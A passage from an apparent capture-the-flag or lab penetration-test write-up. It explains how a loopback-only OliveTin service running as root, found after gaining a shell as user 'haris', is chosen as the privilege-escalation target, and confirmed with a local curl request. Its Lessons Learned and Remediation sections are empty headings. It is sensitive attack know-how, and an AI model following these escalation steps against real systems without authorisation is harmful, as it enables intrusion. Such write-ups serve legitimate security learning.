LISTEN  127.0.0.1:1337   — OliveTin (loopback only)LISTEN  127.0.0.1:3306   — MySQL (loopback only)LISTEN  127.0.0.1:33060  — MySQL X Protocol (loopback only)LISTEN  127.0.0.1:25     — Postfix SMTP (loopback only)
```

Port **1337** is bound exclusively to `127.0.0.1` — meaning it is only accessible from within the machine itself, which is exactly why it didn't appear in the original external Nmap scan. Since we have a shell on the machine as `haris`, we can reach it directly. Combined with the fact that OliveTin is running as root, this loopback-only service is the privilege escalation target.

![[Pasted image 20260701150317.png]]

The key takeaway: every loopback port (`127.0.0.1:*`) was invisible to Nmap because Nmap scanned from outside the machine. We can only see and reach them now because we're already inside as `haris`.

Port 1337 is the only loopback port with no universally-known standard service assigned to it — everything else (3306, 25, 53) has a decades-old standard. That gap, combined with OliveTin appearing in `ps aux` as a root process with a known default port of 1337, is how the connection is made.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

A Google search for **"what is OliveTin"** returns the following:

> _OliveTin is a free, open-source web application that allows you to trigger pre-configured Linux shell commands and scripts through a simple, touch-friendly graphical interface. It turns complex, repetitive terminal commands into simple, one-click buttons._

A follow-up search for **"what is OliveTin's standard port"** confirms:

> _OliveTin's standard default port is `1337`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.5 OliveTin

**Command:** `curl -s http://127.0.0.1:1337/ | head -50`

**Breakdown:**

- `-s`
    - **Description:** Silent mode — suppresses progress output and error messages.
    - **Purpose:** Keeps the output clean, showing only the response body.
- `http://127.0.0.1:1337/`
    - **Description:** The root URL of the OliveTin service on the target's loopback interface.
    - **Purpose:** Confirms the service is alive and responding before interacting with its API.
- `| head -50`
    - **Description:** Pipes the output to `head`, limiting display to the first 50 lines.
    - **Purpose:** Avoids flooding the terminal with the full HTML response — we only need enough to confirm the service is running.

**Result:**

```html
curl -s http://127.0.0.1:1337/ | head -50
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Give safe and simple access to predefined shell commands from a web interface." />

    <title>OliveTin</title>

    <link rel="shortcut icon" type="image/png" href="/assets/OliveTinLogo-jRx-Gghe.png" />
    <link rel="apple-touch-icon" sizes="57x57" href="/assets/OliveTinLogo-57px-B3yOXIxP.png" />
    <link rel="apple-touch-icon" sizes="120x120" href="/assets/OliveTinLogo-120px-BZ3kS-xp.png" />
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/OliveTinLogo-180px-DBoTqUbn.png" />

    <base href="/" />
    <script type="module" crossorigin src="/assets/index-Cr_VwSNJ.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-BzcwB5yK.css">
</head>

<body>
    <slot id="app" />

    <noscript>
        <div class="error">Sorry, JavaScript is required to use OliveTin.</div>
    </noscript>

    <dialog title="Big Error Message" id="big-error" class="error padded-content"></dialog>

    <script type="text/javascript">
        const bigErrorDialog = document.getElementById('big-error')

        /**
         * This is the bootstrap code, which relies on very simple, old javascript
         * to at least display a helpful error message if we can't use OliveTin.
         */
        window.showBigError = function (type, friendlyType, message, isFatal) {
            console.error('Error ' + type + ': ', message);
            return;

            bigErrorDialog.innerHTML = '<h1>Error ' + friendlyType + '</h1><p>' + message + "</p><p><a href='http://docs.olivetin.app/troubleshooting/err-" + type + ".html' target='blank'/>" + type + " error in OliveTin Documentation</a></p>";

            if (isFatal) {
                bigErrorDialog.innerHTML += '<p>You will need to refresh your browser to clear this message.</p>';
            } else {
                bigErrorDialog.innerHTML += '<p>This error message will go away automatically if the problem is solved.</p>';
            }
        }
    </script>
</body>
</html>
```

OliveTin is confirmed running and responding on port 1337. The response is a JavaScript single-page application — the actual dashboard content and action buttons are not embedded in the HTML but loaded dynamically at runtime. This means querying the HTML directly gives us nothing useful beyond confirming the service is alive. To enumerate what commands OliveTin has been configured to run, we go directly to its REST API instead.


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

